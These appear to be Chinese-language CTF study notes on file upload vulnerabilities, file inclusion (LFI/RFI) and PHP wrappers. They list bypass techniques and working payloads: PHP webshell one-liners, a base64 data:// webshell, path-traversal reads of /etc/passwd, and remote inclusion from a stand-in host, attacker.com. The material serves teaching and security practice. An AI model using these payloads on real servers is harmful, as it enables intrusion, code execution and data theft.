## 一、文件上传漏洞知识点回顾

### 1.1 文件上传漏洞原理

```
文件上传漏洞：
  攻击者通过上传恶意文件（如WebShell）到服务器
  然后通过访问该文件执行恶意代码
  从而获取服务器权限

条件：
  1. 存在文件上传功能
  2. 服务器没有对文件进行有效验证
  3. 上传的文件可以被访问
  4. 文件内容可以被执行

常见场景：
  - 头像上传
  - 附件上传
  - 图片上传
```

### 1.2 常见验证方式

```
验证方式分类：
  1. 前端验证：JavaScript代码验证
     - 文件扩展名验证
     - 文件大小验证
     - MIME类型验证
     - 容易绕过（禁用JS或修改请求）
  
  2. 后端验证：服务端代码验证
     - 文件扩展名验证（白名单/黑名单）
     - MIME类型验证（Content-Type）
     - 文件内容验证（文件头、getimagesize）
     - 文件大小验证
```

### 1.3 常见绕过方法

```
绕过方法：
  1. 扩展名绕过：
     - 大小写混淆：.PhP、.pHp
     - 双扩展名：.php.jpg、.php.gif
     - 特殊字符：.php.、.php_、.php%00.jpg
     - 利用解析漏洞：.php5、.phtml
  
  2. MIME类型绕过：
     - 修改Content-Type为image/jpeg等
  
  3. 文件内容绕过：
     - 添加正确的文件头（Magic Number）
     - 使用图片马（copy /b image.jpg + shell.php webshell.jpg）
  
  4. 解析漏洞利用：
     - Apache解析漏洞：从右到左解析扩展名
     - IIS解析漏洞：分号分隔扩展名
     - Nginx解析漏洞：/shell.jpg/shell.php
```

### 1.4 常用WebShell代码

```
PHP WebShell：
  - 一句话木马：<?php @eval($_POST['cmd']); ?>
  - 系统命令执行：<?php system($_POST['cmd']); ?>
  - 图片马：在图片末尾添加PHP代码

使用方法：
  通过POST参数cmd执行命令
  使用Burp或菜刀等工具连接
```

## 二、文件包含漏洞知识点回顾

### 2.1 文件包含漏洞原理

```
文件包含漏洞：
  服务器端脚本语言（如PHP）在包含文件时
  使用了用户可控的变量
  导致攻击者可以包含任意文件

分类：
  1. 本地文件包含（LFI）：包含服务器本地的文件
  2. 远程文件包含（RFI）：包含远程服务器的文件

条件：
  - PHP配置：allow_url_fopen和allow_url_include
  - 文件包含函数：include、require、include_once、require_once
```

### 2.2 LFI利用方法

```
LFI利用方法：
  1. 读取敏感文件：
     ?file=../../etc/passwd
     ?file=../../var/log/apache2/access.log
  
  2. 利用日志文件：
     向服务器发送包含恶意代码的请求
     然后通过LFI包含日志文件执行代码
  
  3. 利用临时文件：
     上传包含恶意代码的文件
     在文件被删除前快速包含临时文件
  
  4. 使用伪协议：
     ?file=php://filter/convert.base64-encode/resource=index.php
     ?file=php://input（执行POST数据中的代码）
```

### 2.3 RFI利用方法

```
RFI利用方法：
  1. 远程包含WebShell：
     ?file=http://attacker.com/shell.php
  
  2. 使用data://协议：
     ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
  
条件：
  - allow_url_include = On
  - allow_url_fopen = On
```

### 2.4 常见绕过方法

```
绕过方法：
  1. 路径遍历：../、..\、..//
  2. 绝对路径：直接使用完整路径
  3. NULL字节截断：%00（PHP < 5.3.4）
  4. 编码绕过：URL编码、双重编码
  5. 使用伪协议：php://、data://、zip://、phar://
```

## 三、PHP伪协议知识点回顾

### 3.1 常用伪协议

```
常用伪协议：
  1. file://：访问本地文件系统
     ?file=file:///etc/passwd
  
  2. php://input：读取POST数据
     ?file=php://input + POST数据：<?php system('ls'); ?>
  
  3. php://filter：过滤处理
     ?file=php://filter/convert.base64-encode/resource=index.php
  
  4. data://：访问数据
     ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
  
  5. http:///https://：访问远程资源
     ?file=http://attacker.com/shell.php
  
  6. zip://：访问ZIP压缩文件
     ?file=zip:///path/to/file.zip#shell.php
  
  7. phar://：访问PHAR文件
     ?file=phar:///path/to/file.phar/index.php
```

### 3.2 伪协议在CTF中的应用

```
应用场景：
  1. 绕过文件包含限制：
     使用php://filter读取文件内容
     使用data://协议执行代码
  
  2. 读取敏感文件：
     使用file://协议直接读取
     使用php://filter读取并编码
  
  3. 执行恶意代码：
     使用php://input执行POST数据
     使用data://协议执行Base64编码的代码
  
  4. 绕过文件上传限制：
     使用zip://协议包含ZIP文件中的PHP文件
```
